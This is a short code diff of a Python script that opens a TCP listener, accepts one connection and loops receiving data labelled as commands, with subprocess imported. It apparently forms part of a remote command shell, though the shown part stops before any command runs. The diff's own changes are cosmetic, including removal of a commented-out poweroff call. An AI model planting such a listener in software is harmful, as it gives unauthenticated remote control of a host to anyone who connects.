@@ -1,9 +1,8 @@
+# Modules #
 import socket
 import sys
 import time
 import subprocess
-
-#subprocess.call("poweroff")
 
 # Creates a TCP/IP socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -14,7 +13,7 @@ sock.bind(server_address)
 
 # Listens for incoming connections
 sock.listen(1)
-sock,(host_c,puerto_c) = sock.accept()
+sock , (host_c,puerto_c) = sock.accept()
 while True:
         cmd  = sock.recv(100000)# recibimos 100000 bytes de datos
 #(EN) Receives 100000 bytes of data
